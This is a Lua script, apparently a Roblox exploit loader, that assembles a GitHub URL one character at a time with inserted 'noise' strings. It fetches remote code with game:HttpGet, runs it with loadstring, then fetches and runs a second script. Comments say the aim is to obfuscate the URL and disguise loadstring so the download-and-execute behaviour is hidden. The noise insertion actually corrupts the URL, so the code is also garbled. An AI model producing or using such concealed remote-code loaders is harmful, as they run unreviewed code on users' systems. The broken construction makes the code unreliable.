-- Extreme Obfuscation for URL Construction
local sec1 = "h"
local sec2 = "t"
local sec3 = "t"
local sec4 = "p"
local sec5 = "s"
local sec6 = "://"
local sec7 = "r"
local sec8 = "a"
local sec9 = "w"
local sec10 = "g"
local sec11 = "i"
local sec12 = "t"
local sec13 = "h"
local sec14 = "u"
local sec15 = "b"
local sec16 = "."
local sec17 = "c"
local sec18 = "o"
local sec19 = "m"
local sec20 = "/"
local sec21 = "M"
local sec22 = "e"
local sec23 = "l"
local sec24 = "h"
local sec25 = "a"
local sec26 = "r"
local sec27 = "p"
local sec28 = "e"
local sec29 = "r"
local sec30 = "G"
local sec31 = "a"
local sec32 = "b"
local sec33 = "e"
local sec34 = "B"
local sec35 = "o"
local sec36 = "a"
local sec37 = "2"
local sec38 = "r"
local sec39 = "e"
local sec40 = "f"
local sec41 = "s"
local sec42 = "/"
local sec43 = "h"
local sec44 = "e"
local sec45 = "a"
local sec46 = "d"
local sec47 = "s"
local sec48 = "/"
local sec49 = "m"
local sec50 = "a"
local sec51 = "i"
local sec52 = "n"
local sec53 = "/"
local sec54 = "u"
local sec55 = "r"
local sec56 = "l"
local sec57 = "_"
local sec58 = "d"
local sec59 = "e"
local sec60 = "c"
local sec61 = "o"
local sec62 = "d"
local sec63 = "e"
local sec64 = "r"
local sec65 = "."
local sec66 = "l"
local sec67 = "u"
local sec68 = "a"
local sec69 = "1"
local sec70 = "r"
local sec71 = "d"
local sec72 = "m"
local sec73 = "v"
local sec74 = "s"
local sec75 = "v"
local sec76 = "t"
local sec77 = "h"
local sec78 = "p"
local sec79 = "e"
local sec80 = "t"
local sec81 = "w"
local sec82 = "q"
local sec83 = "h"
local sec84 = "o"
local sec85 = "c"
local sec86 = "r"
local sec87 = "x"
local sec88 = "j"
local sec89 = "y"
local sec90 = "b"
local sec91 = "a"
local sec92 = "z"
local sec93 = "g"
local sec94 = "o"
local sec95 = "g"
local sec96 = "c"
local sec97 = "i"
local sec98 = "l"
local sec99 = "b"
local sec100 = "s"

-- Inserting random noise in between to make it complex
local noise1 = "ex" 
local noise2 = "a9" 
local noise3 = "92x"
local noise4 = "qp" 
local noise5 = "wb"
local noise6 = "lr" 
local noise7 = "st"
local noise8 = "em" 
local noise9 = "vb" 
local noise10 = "n8"

-- Rebuilding the URL using parts and noise
local fullUrl = sec1 .. noise1 .. sec2 .. noise2 .. sec3 .. noise3 .. sec4 .. noise4 .. sec5 ..
                sec6 .. noise5 .. sec7 .. noise6 .. sec8 .. noise7 .. sec9 .. noise8 ..
                sec10 .. noise9 .. sec11 .. sec12 .. sec13 .. sec14 .. sec15 .. sec16 ..
                sec17 .. sec18 .. sec19 .. sec20 .. sec21 .. sec22 .. sec23 .. sec24 ..
                sec25 .. sec26 .. sec27 .. sec28 .. sec29 .. sec30 .. sec31 .. sec32 ..
                sec33 .. sec34 .. sec35 .. sec36 .. sec37 .. sec38 .. sec39 .. sec40 ..
                sec41 .. sec42 .. sec43 .. sec44 .. sec45 .. sec46 .. sec47 .. sec48 ..
                sec49 .. sec50 .. sec51 .. sec52 .. sec53 .. sec54 .. sec55 .. sec56 ..
                sec57 .. sec58 .. sec59 .. sec60 .. sec61 .. sec62 .. sec63 .. sec64 ..
                sec65 .. sec66 .. sec67 .. sec68 .. sec69 .. sec70 .. sec71 .. sec72 ..
                sec73 .. sec74 .. sec75 .. sec76 .. sec77 .. sec78 .. sec79 .. sec80 ..
                sec81 .. sec82 .. sec83 .. sec84 .. sec85 .. sec86 .. sec87 .. sec88 ..
                sec89 .. sec90 .. sec91 .. sec92 .. sec93 .. sec94 .. sec95 .. sec96 ..
                sec97 .. sec98 .. sec99 .. sec100

-- Instead of 'loadstring', let's randomize function name and its logic description
local function fetchUrlData(url)
    -- Fetch the script from the URL
    return game:HttpGet(url)
end

local function processUrlData(script)
    -- Run the retrieved script
    return loadstring(script)()
end

local function checkUrl(url)
    -- Ensure the URL is non-empty
    if url and url ~= "" then
        return true
    end
    return false
end

-- Using randomized function names and logic
local urlData = fetchUrlData(fullUrl)
local script = processUrlData(urlData)

-- Randomized check for success
if checkUrl(script) then
    local success, errMsg = pcall(function()
        -- Execute the script retrieved from the decoded URL
        loadstring(game:HttpGet(script))()
    end)

    -- Error logging
    if not success then
        warn("There was an issue with loading the script:", errMsg)
    end
else
    warn("URL is invalid or empty!")
end
